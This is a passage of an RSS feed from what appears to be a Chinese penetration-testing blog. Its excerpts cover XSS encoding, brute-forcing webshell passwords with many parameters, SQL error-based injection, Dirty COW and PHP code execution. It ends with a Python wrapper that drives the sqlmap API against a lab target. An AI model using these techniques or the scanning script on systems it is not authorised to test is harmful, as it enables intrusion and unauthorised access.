&lt;img src="https://wyb0.com/img/post/weblogic-check-host-up-port-down.png" alt="">&lt;/p></description></item><item><title>XSS 中的编码</title><link>https://wyb0.com/posts/2017/xss-encode/</link><pubDate>Thu, 30 Mar 2017 15:25:37 +0000</pubDate><guid>https://wyb0.com/posts/2017/xss-encode/</guid><description>&lt;p>&lt;img src="https://wyb0.com/img/anime/anime006.jpg" alt="攻壳机动队">&lt;/p>
&lt;h3 id="0x00-浏览器解析">0x00 浏览器解析&lt;/h3>
&lt;pre tabindex="0">&lt;code>浏览器收到服务器发来的HTML内容，会从头解析，遇到&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;时，
会调用js脚本解析器来解析并执行脚本，然后继续解析其他的HTML内容，
对于需要触发才能执行的事件，当事件触发时脚本解析器才会解析其中的脚本，
在这之前它是HTML的一部分
&lt;/code>&lt;/pre>&lt;h3 id="0x01-一些编码">0x01 一些编码&lt;/h3>
&lt;ul>
&lt;li>URL编码&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>%+字符的ASCII编码对应的两位十六进制，如&amp;#34;/&amp;#34;的url编码为&amp;#34;%2F&amp;#34;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>HTML编码&lt;/p></description></item><item><title>利用多参数提高 webshell 爆破速度</title><link>https://wyb0.com/posts/2017/multi-parameter-blasting-webshell/</link><pubDate>Fri, 17 Feb 2017 10:32:24 +0000</pubDate><guid>https://wyb0.com/posts/2017/multi-parameter-blasting-webshell/</guid><description>&lt;h3 id="0x00-原理">0x00 原理&lt;/h3>
&lt;p>之前在&lt;a href="https://www.t00ls.net/viewthread.php?tid=36985">https://www.t00ls.net/viewthread.php?tid=36985&lt;/a>看到这个思路的。&lt;/p>
&lt;p>Apache下默认同时允许接收1000个参数；IIS下默认同时允许接收5883个参数，可以一次提交多个密码，从而快速爆破。&lt;/p></description></item><item><title>Python 实现 CDN 的判断</title><link>https://wyb0.com/posts/2016/cdn-detection/</link><pubDate>Fri, 23 Dec 2016 21:10:05 +0000</pubDate><guid>https://wyb0.com/posts/2016/cdn-detection/</guid><description>&lt;p>&lt;img src="https://wyb0.com/img/anime/anime002.jpg" alt="银魂">&lt;/p>
&lt;h3 id="0x00-什么是cdn">0x00 什么是CDN&lt;/h3>
&lt;pre tabindex="0">&lt;code>CDN的全称是Content Delivery Network，即内容分发网络。主要功能是在不同地点缓存内容，
运营商会在全国各地的节点上缓存你的网站网页，通过负载均衡技术，将用户的请求定向到最合适的
缓存服务器上去获取内容，比如说你是上海用户，你访问www.aa.com就会被重定向到上海的节点，
你是北京用户，你也访问www.aa.com，但是你会被重定向到上海的节点。
&lt;/code>&lt;/pre>&lt;h3 id="0x01-判断方法">0x01 判断方法&lt;/h3>
&lt;ul>
&lt;li>可以查询CNAME记录，每个cdn厂商都有特有的特征串&lt;/li>
&lt;li>查看http返回头的头部信息&lt;/li>
&lt;/ul>
&lt;h3 id="0x02-代码">0x02 代码&lt;/h3>
&lt;p>首先安装dnspython这个第三方模块：pip install dnspython&lt;/p></description></item><item><title>[转] MySQL 报错注入原理分析(count()、rand()、group by)</title><link>https://wyb0.com/posts/2016/mysql-injection-error-based-theory-count-rand-groupby/</link><pubDate>Sun, 13 Nov 2016 11:59:26 +0000</pubDate><guid>https://wyb0.com/posts/2016/mysql-injection-error-based-theory-count-rand-groupby/</guid><description>&lt;p>原文链接：&lt;a href="http://drops.wooyun.org/tips/14312?_blank">http://drops.wooyun.org/tips/14312&lt;/a>&lt;/p>
&lt;h3 id="0x00-疑问">0x00 疑问&lt;/h3>
&lt;p>一直在用mysql数据库报错注入方法，但为何会报错？&lt;/p>
&lt;p>&lt;img src="https://wyb0.com/img/post/wooyun-drops-tips-14312-1.jpg" alt="">&lt;/p>
&lt;p>百度谷歌知乎了一番，发现大家都是把官网的结论发一下截图，然后执行sql语句证明一下结论，但是没有人去深入研究为什么rand不能和order by一起使用，也没彻底说明三者同时使用报错的原理。&lt;/p></description></item><item><title>Nessus 的安装和卸载</title><link>https://wyb0.com/posts/2016/nessus-install-and-remove/</link><pubDate>Sun, 13 Nov 2016 11:59:26 +0000</pubDate><guid>https://wyb0.com/posts/2016/nessus-install-and-remove/</guid><description>&lt;h3 id="0x00-下载-nessus-的-deb-安装包">0x00 下载 Nessus 的 deb 安装包&lt;/h3>
&lt;p>去【&lt;a href="http://www.tenable.com/products/nessus/select-your-operating-system?_blank">这里&lt;/a>】，选择家庭版，然后下载对应的安装包
&lt;img src="https://wyb0.com/img/post/Nessus_Home.png" alt="70">
&lt;img src="https://wyb0.com/img/post/select_nessus_deb.png" alt="40">&lt;/p>
&lt;h3 id="0x01-本地安装-nessus">0x01 本地安装 Nessus&lt;/h3>
&lt;p>&lt;img src="https://wyb0.com/img/post/install_nessus.png" alt="60">&lt;/p>
&lt;h3 id="0x02-执行后续安装步骤">0x02 执行后续安装步骤:&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>启动nessus
&lt;img src="https://wyb0.com/img/post/start_nessus.png" alt="45">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>web访问nessus服务
&lt;img src="https://wyb0.com/img/post/web_nessus.png" alt="80">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>设置账户和密码
&lt;img src="https://wyb0.com/img/post/setaccount.png" alt="30">
&lt;img src="https://wyb0.com/img/post/code.png" alt="50">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>申请code，可以在【&lt;a href="http://www.tenable.com/products/nessus-home">这里&lt;/a>】申请
&lt;img src="https://wyb0.com/img/post/register_code.png" alt="30">&lt;/p></description></item><item><title>脏牛漏洞</title><link>https://wyb0.com/posts/2016/dirty-cow-vulnerabilities/</link><pubDate>Sat, 22 Oct 2016 00:10:46 +0000</pubDate><guid>https://wyb0.com/posts/2016/dirty-cow-vulnerabilities/</guid><description>&lt;h3 id="0x00-测试环境">0x00 测试环境&lt;/h3>
&lt;p>我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，若理解有误则希望大家提意见&lt;/p></description></item><item><title>代码执行漏洞(二)</title><link>https://wyb0.com/posts/2016/code-execution-vulnerabilities-2/</link><pubDate>Fri, 14 Oct 2016 13:16:32 +0000</pubDate><guid>https://wyb0.com/posts/2016/code-execution-vulnerabilities-2/</guid><description>&lt;h4 id="接着上一篇代码执行漏洞一posts2016code-execution-vulnerabilities">接着上一篇：&lt;a href="https://wyb0.com/posts/2016/code-execution-vulnerabilities/">代码执行漏洞(一)&lt;/a>&lt;/h4>
&lt;h3 id="0x00-函数create_function">0x00 函数create_function()&lt;/h3>
&lt;p>php中的函数create_function()可以创建一个匿名函数，其函数原型如下：&lt;/p></description></item><item><title>SqlmapApi 常用方法封装</title><link>https://wyb0.com/posts/2016/package-sqlmapapi-common-function/</link><pubDate>Wed, 21 Sep 2016 17:37:33 +0000</pubDate><guid>https://wyb0.com/posts/2016/package-sqlmapapi-common-function/</guid><description>&lt;h3 id="0x00-代码如下">0x00 代码如下&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -*- coding: utf-8 -*-&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> threading
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> requests
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> json
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> time &lt;span style="color:#f92672">import&lt;/span> sleep
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Sqli&lt;/span>(threading&lt;span style="color:#f92672">.&lt;/span>Thread):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;docstring for AutoSqli&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self, server, target, data&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>, referer&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>, cookie&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threading&lt;span style="color:#f92672">.&lt;/span>Thread&lt;span style="color:#f92672">.&lt;/span>__init__(self)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>server &lt;span style="color:#f92672">=&lt;/span> server[&lt;span style="color:#ae81ff">0&lt;/span>:&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#66d9ef">if&lt;/span> server[&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>]&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> server
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>target &lt;span style="color:#f92672">=&lt;/span> target
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>data &lt;span style="color:#f92672">=&lt;/span> data
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>referer &lt;span style="color:#f92672">=&lt;/span> referer
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>cookie &lt;span style="color:#f92672">=&lt;/span> cookie
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>taskid &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>data
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">new_task&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">/task/new&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(self&lt;span style="color:#f92672">.&lt;/span>server)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>taskid &lt;span style="color:#f92672">=&lt;/span> json&lt;span style="color:#f92672">.&lt;/span>loads(requests&lt;span style="color:#f92672">.&lt;/span>get(url)&lt;span style="color:#f92672">.&lt;/span>text)[&lt;span style="color:#e6db74">&amp;#39;taskid&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> len(self&lt;span style="color:#f92672">.&lt;/span>taskid)&lt;span style="color:#f92672">&amp;gt;&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Create new task,taskid is: &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>taskid
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">False&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">set_option&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> headers &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#e6db74">&amp;#39;Content-Type&amp;#39;&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;application/json&amp;#39;&lt;/span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> option &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#e6db74">&amp;#34;options&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;smart&amp;#34;&lt;/span>: &lt;span style="color:#66d9ef">True&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">/option/&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">/set&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(self&lt;span style="color:#f92672">.&lt;/span>server,self&lt;span style="color:#f92672">.&lt;/span>taskid)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> resp &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>post(url, data&lt;span style="color:#f92672">=&lt;/span>json&lt;span style="color:#f92672">.&lt;/span>dumps(option), headers&lt;span style="color:#f92672">=&lt;/span>headers)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> json&lt;span style="color:#f92672">.&lt;/span>loads(resp&lt;span style="color:#f92672">.&lt;/span>text)[&lt;span style="color:#e6db74">&amp;#39;success&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">start_scan&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> headers &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#e6db74">&amp;#39;Content-Type&amp;#39;&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;application/json&amp;#39;&lt;/span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> payload &lt;span style="color:#f92672">=&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;url&amp;#39;&lt;/span>: self&lt;span style="color:#f92672">.&lt;/span>target,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;data&amp;#39;&lt;/span>: self&lt;span style="color:#f92672">.&lt;/span>data,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;cookie&amp;#39;&lt;/span>: self&lt;span style="color:#f92672">.&lt;/span>cookie,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;referer&amp;#39;&lt;/span>: self&lt;span style="color:#f92672">.&lt;/span>referer
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">/scan/&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">/start&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(self&lt;span style="color:#f92672">.&lt;/span>server,self&lt;span style="color:#f92672">.&lt;/span>taskid)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">=&lt;/span> json&lt;span style="color:#f92672">.&lt;/span>loads(requests&lt;span style="color:#f92672">.&lt;/span>post(url,data&lt;span style="color:#f92672">=&lt;/span>json&lt;span style="color:#f92672">.&lt;/span>dumps(payload),headers&lt;span style="color:#f92672">=&lt;/span>headers)&lt;span style="color:#f92672">.&lt;/span>text)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> len(str(t[&lt;span style="color:#e6db74">&amp;#39;engineid&amp;#39;&lt;/span>])) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">and&lt;/span> t[&lt;span style="color:#e6db74">&amp;#39;success&amp;#39;&lt;/span>]:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;[&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">] Start scan&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>taskid
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">False&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">get_status&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">/scan/&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">/status&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(self&lt;span style="color:#f92672">.&lt;/span>server,self&lt;span style="color:#f92672">.&lt;/span>taskid)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> status &lt;span style="color:#f92672">=&lt;/span> json&lt;span style="color:#f92672">.&lt;/span>loads(requests&lt;span style="color:#f92672">.&lt;/span>get(url)&lt;span style="color:#f92672">.&lt;/span>text)[&lt;span style="color:#e6db74">&amp;#39;status&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> status &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;running&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#e6db74">&amp;#39;running&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> status &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;terminated&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#e6db74">&amp;#39;terminated&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#e6db74">&amp;#39;error&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">get_data&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">/scan/&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">/data&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(self&lt;span style="color:#f92672">.&lt;/span>server,self&lt;span style="color:#f92672">.&lt;/span>taskid)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> data &lt;span style="color:#f92672">=&lt;/span> json&lt;span style="color:#f92672">.&lt;/span>loads(requests&lt;span style="color:#f92672">.&lt;/span>get(url)&lt;span style="color:#f92672">.&lt;/span>text)[&lt;span style="color:#e6db74">&amp;#39;data&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> len(data) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#39;[] not injection:&lt;/span>&lt;span style="color:#ae81ff">\t&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>target
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#39;=======&amp;gt; injection:&lt;/span>&lt;span style="color:#ae81ff">\t&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>target
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>data &lt;span style="color:#f92672">=&lt;/span> data
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">delete_task&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">/task/&lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">/delete&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(self&lt;span style="color:#f92672">.&lt;/span>server,self&lt;span style="color:#f92672">.&lt;/span>taskid)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> json&lt;span style="color:#f92672">.&lt;/span>loads(requests&lt;span style="color:#f92672">.&lt;/span>get(url)&lt;span style="color:#f92672">.&lt;/span>text)[&lt;span style="color:#e6db74">&amp;#39;success&amp;#39;&lt;/span>]:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;[&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">] Delete task&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>taskid
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">False&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">write_to_file&lt;/span>(self,msg):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;result.txt&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;a+&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> f&lt;span style="color:#f92672">.&lt;/span>write(json&lt;span style="color:#f92672">.&lt;/span>dumps(msg)&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>new_task():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">False&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>set_option()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>start_scan():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">False&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>get_status() &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;running&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sleep(&lt;span style="color:#ae81ff">10&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>get_status() &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;terminated&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>get_data()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>write_to_file(self&lt;span style="color:#f92672">.&lt;/span>data)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>delete_task()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">Exception&lt;/span>, e:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print e
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;__main__&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> server &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;http://127.0.0.1:8775&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> target &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;http://192.168.188.134/sqli/Less-1/?id=1&amp;#39;&lt;/span>
